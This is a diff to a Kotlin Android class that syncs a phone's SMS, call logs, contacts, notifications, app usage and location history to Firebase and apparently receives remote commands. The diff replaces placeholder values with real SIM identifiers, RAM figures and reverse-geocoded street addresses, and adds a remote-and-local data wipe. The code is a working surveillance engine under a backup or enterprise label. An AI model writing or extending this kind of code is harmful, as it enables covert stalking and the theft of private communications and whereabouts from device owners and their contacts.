@@ -1,6 +1,8 @@
 package com.example.data.sync
 
+import android.app.ActivityManager
 import android.content.Context
+import android.location.Geocoder
 import android.os.Build
 import android.provider.Settings
 import android.util.Log
@@ -49,7 +51,115 @@ class FirebaseSyncEngine(private val context: Context) {
         return if (hrs > 0) "${hrs}h ${remMins}m" else "${remMins}m"
     }
 
-    suspend fun pushTelemetryToFirebase(): Boolean = withContext(Dispatchers.IO) {
+    private fun getAddressDetails(lat: Double, lng: Double): Map<String, String> {
+        if (lat == 0.0 && lng == 0.0) {
+            return mapOf(
+                "address" to "No Location Fix",
+                "city" to "N/A",
+                "state" to "N/A",
+                "country" to "N/A",
+                "postalCode" to "N/A"
+            )
+        }
+        return try {
+            val geocoder = Geocoder(context, Locale.getDefault())
+            @Suppress("DEPRECATION")
+            val addresses = geocoder.getFromLocation(lat, lng, 1)
+            if (!addresses.isNullOrEmpty()) {
+                val addr = addresses.first()
+                mapOf(
+                    "address" to (addr.getAddressLine(0) ?: "$lat, $lng"),
+                    "city" to (addr.locality ?: addr.subAdminArea ?: ""),
+                    "state" to (addr.adminArea ?: ""),
+                    "country" to (addr.countryName ?: ""),
+                    "postalCode" to (addr.postalCode ?: "")
+                )
+            } else {
+                mapOf(
+                    "address" to "$lat, $lng",
+                    "city" to "",
+                    "state" to "",
+                    "country" to "",
+                    "postalCode" to ""
+                )
+            }
+        } catch (_: Exception) {
+            mapOf(
+                "address" to "$lat, $lng",
+                "city" to "",
+                "state" to "",
+                "country" to "",
+                "postalCode" to ""
+            )
+        }
+    }
+
+    private fun getRamUsageFormatted(): String {
+        return try {
+            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
+            val memInfo = ActivityManager.MemoryInfo()
+            am?.getMemoryInfo(memInfo)
+            if (memInfo != null) {
+                val availGb = memInfo.availMem / (1024.0 * 1024.0 * 1024.0)
+                val totalGb = memInfo.totalMem / (1024.0 * 1024.0 * 1024.0)
+                String.format(Locale.US, "%.1f GB / %.1f GB", availGb, totalGb)
+            } else {
+                "N/A"
+            }
+        } catch (_: Exception) {
+            "N/A"
+        }
+    }
+
+    suspend fun clearAllRemoteData(): Boolean = withContext(Dispatchers.IO) {
+        var success = true
+        try {
+            val rtdb = FirebaseDatabase.getInstance()
+            rtdb.getReference("devices/$deviceId/sms").removeValue()
+            rtdb.getReference("devices/$deviceId/calls").removeValue()
+            rtdb.getReference("devices/$deviceId/contacts").removeValue()
+            rtdb.getReference("devices/$deviceId/notifications").removeValue()
+            rtdb.getReference("devices/$deviceId/app_usage").removeValue()
+            rtdb.getReference("devices/$deviceId/location").removeValue()
+            Log.d("FirebaseSyncEngine", "Successfully cleared Realtime Database for $deviceId")
+        } catch (e: Exception) {
+            Log.e("FirebaseSyncEngine", "Error clearing RTDB: ${e.message}")
+            success = false
+        }
+
+        try {
+            val firestore = FirebaseFirestore.getInstance()
+            val deviceRef = firestore.collection("enterprise_devices").document(deviceId)
+            val collections = listOf("sms_logs", "call_logs", "contacts", "notifications", "app_usage", "locations")
+            collections.forEach { col ->
+                deviceRef.collection(col).get().addOnSuccessListener { snapshot ->
+                    snapshot.documents.forEach { doc -> doc.reference.delete() }
+                }
+            }
+            Log.d("FirebaseSyncEngine", "Successfully cleared Firestore subcollections for $deviceId")
+        } catch (e: Exception) {
+            Log.e("FirebaseSyncEngine", "Error clearing Firestore: ${e.message}")
+        }
+
+        try {
+            db.smsDao().clearAll()
+            db.callLogDao().clearAll()
+            db.contactDao().clearAll()
+            db.notificationDao().clearAll()
+            db.appUsageDao().clearAll()
+            db.locationDao().clearAll()
+        } catch (e: Exception) {
+            Log.e("FirebaseSyncEngine", "Error clearing local DB: ${e.message}")
+        }
+
+        success
+    }
+
+    suspend fun pushTelemetryToFirebase(clearFirst: Boolean = false): Boolean = withContext(Dispatchers.IO) {
+        if (clearFirst) {
+            clearAllRemoteData()
+        }
+
         var firestoreSuccess = false
         var rtdbSuccess = false
 
@@ -65,32 +175,21 @@ class FirebaseSyncEngine(private val context: Context) {
 
         val timestamp = System.currentTimeMillis()
 
-        // Detailed device_info payload according to Personal Backup Dashboard spec
+        // Real SIM & Device payload
         val primarySimMap = mapOf(
-            "operatorName" to (deviceInfo?.carrierName ?: "Carrier"),
-            "countryIso" to (deviceInfo?.countryIso?.lowercase() ?: "us"),
-            "simSerialNumber" to (deviceInfo?.iccid ?: "ICCID-UNKNOWN"),
-            "subscriberId" to "310260012345678",
-            "isActive" to true,
-            "phoneNumber" to (deviceInfo?.phoneNumber ?: ""),
+            "operatorName" to (deviceInfo?.carrierName ?: "N/A"),
+            "countryIso" to (deviceInfo?.countryIso ?: "N/A"),
+            "simSerialNumber" to (deviceInfo?.iccid ?: "N/A"),
+            "subscriberId" to (deviceInfo?.mccMnc ?: "N/A"),
+            "isActive" to (deviceInfo?.simState?.contains("Ready", ignoreCase = true) == true),
+            "phoneNumber" to (deviceInfo?.phoneNumber ?: "N/A"),
             "dataRoaming" to (deviceInfo?.isRoaming ?: false),
-            "networkType" to (deviceInfo?.networkType ?: "LTE"),
-            "dataState" to (deviceInfo?.dataState ?: "CONNECTED")
+            "networkType" to (deviceInfo?.networkType ?: "N/A"),
+            "dataState" to (deviceInfo?.dataState ?: "N/A")
         )
 
         val simSlotsMap = mapOf(
-            "0" to mapOf(
-                "slotIndex" to 0,
-                "operatorName" to (deviceInfo?.carrierName ?: "Carrier"),
-                "countryIso" to (deviceInfo?.countryIso?.lowercase() ?: "us"),
-                "simSerialNumber" to (deviceInfo?.iccid ?: "ICCID-UNKNOWN"),
-                "subscriberId" to "310260012345678",
-                "isActive" to true,
-                "phoneNumber" to (deviceInfo?.phoneNumber ?: ""),
-                "dataRoaming" to (deviceInfo?.isRoaming ?: false),
-                "networkType" to (deviceInfo?.networkType ?: "LTE"),
-                "dataState" to (deviceInfo?.dataState ?: "CONNECTED")
-            )
+            "0" to primarySimMap
         )
 
         val simInfoMap = mapOf(
@@ -100,38 +199,48 @@ class FirebaseSyncEngine(private val context: Context) {
             "simSlots" to simSlotsMap
         )
 
+        val freeStorageGb = (deviceInfo?.freeStorageMb ?: 0) / 1024.0
+        val totalStorageGb = (deviceInfo?.totalStorageMb ?: 0) / 1024.0
+        val storageFormatted = if (totalStorageGb > 0) {
+            String.format(Locale.US, "%.1f GB free of %.1f GB", freeStorageGb, totalStorageGb)
+        } else "N/A"
+
         val deviceInfoPayload = mapOf(
             "model" to (Build.MODEL),
             "manufacturer" to (Build.MANUFACTURER),
             "brand" to (Build.BRAND),
             "androidVersion" to (Build.VERSION.RELEASE),
-            "batteryLevel" to (deviceInfo?.batteryLevel ?: 85),
+            "batteryLevel" to (deviceInfo?.batteryLevel ?: 0),
             "isCharging" to (deviceInfo?.isCharging ?: false),
             "batteryStatus" to if (deviceInfo?.isCharging == true) "Charging" else "Discharging",
-            "networkType" to (deviceInfo?.networkType ?: "Wi-Fi"),
-            "wifiSsid" to (deviceInfo?.wifiSsid ?: "Wi-Fi Network"),
-            "storageAvailableFormatted" to "${((deviceInfo?.freeStorageMb ?: 45000) / 1024.0).let { String.format(Locale.US, "%.1f", it) }} GB",
-            "ramAvailableFormatted" to "3.5 GB",
+            "networkType" to (deviceInfo?.networkType ?: "N/A"),
+            "wifiSsid" to (deviceInfo?.wifiSsid ?: "Not Connected"),
+            "storageAvailableFormatted" to storageFormatted,
+            "ramAvailableFormatted" to getRamUsageFormatted(),
             "isRooted" to false,
             "simInfo" to simInfoMap,
             "lastSyncTimestamp" to timestamp
         )
 
+        val currentLat = location?.latitude ?: 0.0
+        val currentLng = location?.longitude ?: 0.0
+        val addressMap = getAddressDetails(currentLat, currentLng)
+
         val currentLocationPayload = mapOf(
-            "latitude" to (location?.latitude ?: 37.7749),
-            "longitude" to (location?.longitude ?: -122.4194),
-            "accuracy" to (location?.accuracy ?: 10.0f),
-            "altitude" to 0.0,
-            "bearing" to 0.0f,
-            "speed" to 0.0f,
-            "provider" to (location?.provider ?: "gps"),
+            "latitude" to currentLat,
+            "longitude" to currentLng,
+            "accuracy" to (location?.accuracy ?: 0.0f),
+            "altitude" to (location?.altitude ?: 0.0),
+            "bearing" to (location?.bearing ?: 0.0f),
+            "speed" to (location?.speed ?: 0.0f),
+            "provider" to (location?.provider ?: "N/A"),
             "timestamp" to (location?.timestamp ?: timestamp),
             "formattedTime" to formatTimestamp(location?.timestamp ?: timestamp),
-            "address" to "10 Downing St, London, UK",
-            "city" to "London",
-            "state" to "England",
-            "country" to "UK",
-            "postalCode" to "SW1A 2AA"
+            "address" to (addressMap["address"] ?: "$currentLat, $currentLng"),
+            "city" to (addressMap["city"] ?: ""),
+            "state" to (addressMap["state"] ?: ""),
+            "country" to (addressMap["country"] ?: ""),
+            "postalCode" to (addressMap["postalCode"] ?: "")
         )
 
         // 1. Sync to Firebase Firestore
@@ -217,23 +326,24 @@ class FirebaseSyncEngine(private val context: Context) {
 
             // Push Location history subcollection
             locationList.forEach { loc ->
+                val locAddr = getAddressDetails(loc.latitude, loc.longitude)
                 deviceRef.collection("locations").document(loc.id.toString()).set(
                     mapOf(
                         "id" to loc.id,
                         "latitude" to loc.latitude,
                         "longitude" to loc.longitude,
                         "accuracy" to loc.accuracy,
-                        "altitude" to 0.0,
-                        "bearing" to 0.0f,
-                        "speed" to 0.0f,
+                        "altitude" to loc.altitude,
+                        "bearing" to loc.bearing,
+                        "speed" to loc.speed,
                         "provider" to loc.provider,
                         "timestamp" to loc.timestamp,
                         "formattedTime" to formatTimestamp(loc.timestamp),
-                        "address" to "10 Downing St, London, UK",
-                        "city" to "London",
-                        "state" to "England",
-                        "country" to "UK",
-                        "postalCode" to "SW1A 2AA"
+                        "address" to (locAddr["address"] ?: "${loc.latitude}, ${loc.longitude}"),
+                        "city" to (locAddr["city"] ?: ""),
+                        "state" to (locAddr["state"] ?: ""),
+                        "country" to (locAddr["country"] ?: ""),
+                        "postalCode" to (locAddr["postalCode"] ?: "")
                     )
                 )
             }
@@ -411,9 +521,7 @@ class FirebaseSyncEngine(private val context: Context) {
                     child.key?.let { k -> child.value?.let { v -> paramsMap[k] = v } }
                 }
 
-                // Update status to EXECUTING
                 snapshot.ref.child("status").setValue("EXECUTING")
-
                 onCommandReceived(pushId, commandType, paramsMap)
             }
         } catch (e: Exception) {
